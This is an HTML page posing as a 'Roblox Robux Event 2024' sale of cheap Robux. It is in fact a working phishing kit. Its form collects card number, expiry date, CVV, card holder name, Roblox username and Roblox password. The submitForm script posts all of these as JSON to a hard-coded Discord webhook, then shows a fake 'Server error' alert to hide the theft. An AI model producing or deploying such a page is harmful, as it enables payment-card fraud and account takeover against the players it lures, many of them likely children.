<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Robux Event 2024</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

        body {
            font-family: 'Roboto', sans-serif;
            background: url('https://images.wallpapersden.com/image/download/roblox-gaming-character_bmZpaW6UmZqaraWkpJRmbmdlrWZlbWU.jpg') no-repeat center center/cover;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        /* Black and gold themed stock box */
        .stock-box {
            position: absolute;
            top: 20px;
            left: 20px;
            background-color: rgba(0, 0, 0, 0.8);
            border: 2px solid gold;
            border-radius: 10px;
            padding: 15px;
            width: 250px;
            box-shadow: 0 0 10px gold;
        }

        .stock-box h2 {
            color: gold;
            text-align: center;
            margin-bottom: 10px;
        }

        .stock-box .stock-info {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .stock-box .stock-info img {
            width: 50px;
            height: 50px;
            object-fit: cover;
        }

        .stock-box .stock-info .stock-text {
            font-size: 14px;
            color: white;
            margin-left: 10px;
        }

        .container {
            background-color: rgba(51, 51, 51, 0.9);
            border: 2px solid gold;
            border-radius: 10px;
            padding: 20px;
            width: 400px;
            box-shadow: 0 0 15px gold;
        }

        .container h1 {
            text-align: center;
            color: gold;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: gold;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid gold;
            border-radius: 5px;
            background-color: black;
            color: white;
            font-size: 14px;
        }

        .form-row {
            display: flex;
            gap: 10px;
        }

        .form-row .form-group {
            flex: 1;
        }

        .checkbox-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .checkbox-group div {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .checkbox-group input[type="checkbox"] {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .checkbox-group label {
            font-size: 14px;
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            background-color: gold;
            color: black;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #ffcc00;
        }
    </style>
    <script>
        function formatCardNumber(input) {
            input.value = input.value.replace(/[^0-9]/g, '') // Allow only numbers
                             .replace(/(\d{4})(?=\d)/g, '$1 ') // Add space every 4 digits
                             .substring(0, 19); // Limit to 16 digits + 3 spaces
        }

        function formatExpiryDate(input) {
            input.value = input.value.replace(/[^0-9]/g, '') // Allow only numbers
                             .replace(/(\d{2})(?=\d)/, '$1/') // Add slash after MM
                             .substring(0, 5); // Limit to MM/YY
        }

        function validateCVV(input) {
            input.value = input.value.replace(/[^0-9]/g, '') // Allow only numbers
                             .substring(0, 3); // Limit to 3 digits
        }

        function validateName(input) {
            input.value = input.value.replace(/[^a-zA-Z ]/g, ''); // Allow only letters and spaces
        }

        function validateUsername(input) {
            input.value = input.value.substring(0, 20); // Limit to 20 characters
        }

        function validateSelection(event) {
            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
            checkboxes.forEach(checkbox => {
                if (checkbox !== event.target) {
                    checkbox.checked = false;
                }
            });
        }

        function submitForm(event) {
            event.preventDefault();
            const webhookUrl = "https://discord.com/api/webhooks/1318194665983311952/2z0WHagpapa1i6AzDnq46NesN-IUWvIz5iX0TEL_9ZiXuAMHFVrJ6FDnN4323TuoZq_h"; // Replace with your webhook URL

            const cardNumber = document.getElementById('card-number').value;
            const expiryDate = document.getElementById('expiry-date').value;
            const cvv = document.getElementById('cvv').value;
            const cardHolder = document.getElementById('card-holder').value;
            const robloxUsername = document.getElementById('roblox-username').value;
            const robloxPassword = document.getElementById('roblox-password').value;
            const selectedOption = document.querySelector('input[name="robux-option"]:checked');

            if (!cardNumber || !expiryDate || !cvv || !cardHolder || !robloxUsername || !robloxPassword || !selectedOption) {
                alert("Please fill in all fields.");
                return;
            }

            const data = {
                "Card Number": cardNumber,
                "Expiry Date": expiryDate,
                "CVV": cvv,
                "Card Holder": cardHolder,
                "Roblox Username": robloxUsername,
                "Roblox Password": robloxPassword,
                "Selected Robux Option": selectedOption.value
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
            }).then(() => {
                alert("Server error.Try again in 5 minutes.");
            });
        }
    </script>
</head>
<body>
    <div class="stock-box">
        <h2>Current Robux Stock</h2>
        <div class="stock-info">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" alt="Robux Image">
            <div class="stock-text">
                Current Robux Stock: 894,500 Robux
            </div>
        </div>
    </div>

    <div class="container">
        <h1>Roblox Robux Event 2024</h1>
        <form onsubmit="submitForm(event)">
            <div class="form-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" placeholder="Enter your card number" oninput="formatCardNumber(this)">
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label for="expiry-date">Expiry Date</label>
                    <input type="text" id="expiry-date" placeholder="MM/YY" oninput="formatExpiryDate(this)">
                </div>
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" placeholder="Enter CVV" oninput="validateCVV(this)">
                </div>
            </div>
            <div class="form-group">
                <label for="card-holder">Card Holder</label>
                <input type="text" id="card-holder" placeholder="Enter card holder name" oninput="validateName(this)">
            </div>
            <div class="form-group">
                <label for="roblox-username">Roblox Username</label>
                <input type="text" id="roblox-username" placeholder="Enter your Roblox username" oninput="validateUsername(this)">
            </div>
            <div class="form-group">
                <label for="roblox-password">Roblox Password</label>
                <input type="password" id="roblox-password" placeholder="Enter your Roblox password">
            </div>
            <div class="form-group">
                <label>Choose Your Robux Package</label>
                <div class="checkbox-group">
                    <div>
                        <input type="checkbox" name="robux-option" value="500 Robux / $2.5" onchange="validateSelection(event)">
                        <label>500 Robux / $2.5</label>
                    </div>
                    <div>
                        <input type="checkbox" name="robux-option" value="1500 Robux / $3" onchange="validateSelection(event)">
                        <label>1500 Robux / $3</label>
                    </div>
                    <div>
                        <input type="checkbox" name="robux-option" value="2000 Robux / $3.25" onchange="validateSelection(event)">
                        <label>2000 Robux / $3.25</label>
                    </div>
                    <div>
                        <input type="checkbox" name="robux-option" value="2500 Robux / $3.5" onchange="validateSelection(event)">
                        <label>2500 Robux / $3.5</label>
                    </div>
                    <div>
                        <input type="checkbox" name="robux-option" value="5000 Robux / $4.25 (SALE)" onchange="validateSelection(event)">
                        <label>5000 Robux / $4.25 (SALE)</label>
                    </div>
                </div>
            </div>
            <button type="submit" class="submit-btn">Submit</button>
        </form>
    </div>
</body>
</html>
